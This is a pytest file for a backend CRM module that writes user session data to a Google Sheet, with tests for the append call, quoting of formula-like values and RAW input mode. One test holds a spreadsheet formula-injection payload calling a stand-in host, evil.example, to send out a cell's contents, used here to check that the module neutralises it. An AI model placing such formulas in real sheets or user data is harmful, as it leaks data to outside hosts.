from unittest.mock import MagicMock, patch

import pytest

from backend.session import Session


def _make_session(**overrides):
    s = Session.new("@u", "BUSINESS", "tok")
    s.email = "u@example.com"
    s.name = "User"
    s.questionnaire.niche = "Fitness"
    s.questionnaire.goal = "Crescer seguidores"
    s.questionnaire.management_style = "seeking_agency"
    s.utm_source = "ig_bio"
    s.amount_paid_brl = 6700
    for key, value in overrides.items():
        setattr(s, key, value)
    return s


def _mock_sheets():
    service = MagicMock()
    values = MagicMock()
    service.spreadsheets.return_value.values.return_value = values
    append = MagicMock()
    append.execute.return_value = {}
    values.append.return_value = append
    return service, values


@pytest.mark.asyncio
async def test_crm_append_calls_sheets_api():
    service, values = _mock_sheets()

    with patch("backend.crm._get_sheets_service", return_value=service):
        from backend.crm import append_to_crm

        await append_to_crm(_make_session())

    values.append.assert_called_once()
    kwargs = values.append.call_args.kwargs
    assert kwargs["spreadsheetId"] == "sheet123"
    rows = kwargs["body"]["values"][0]
    # "@" is a formula prefix, so the handle is stored quoted (see the test below).
    assert "'@u" in rows
    assert "Fitness" in rows
    assert "Quente" in rows  # seeking_agency -> Quente


@pytest.mark.asyncio
async def test_crm_neutralises_formula_injection():
    """Item 13 analogue: a name starting with '=' must land as text, not a formula."""
    service, values = _mock_sheets()
    payload = '=IMPORTXML(CONCAT("https://evil.example/?v=",A1),"//a")'

    with patch("backend.crm._get_sheets_service", return_value=service):
        from backend.crm import append_to_crm

        await append_to_crm(_make_session(name=payload))

    rows = values.append.call_args.kwargs["body"]["values"][0]
    assert payload not in rows
    assert "'" + payload in rows


@pytest.mark.asyncio
async def test_crm_uses_raw_value_input():
    service, values = _mock_sheets()

    with patch("backend.crm._get_sheets_service", return_value=service):
        from backend.crm import append_to_crm

        await append_to_crm(_make_session())

    assert values.append.call_args.kwargs["valueInputOption"] == "RAW"
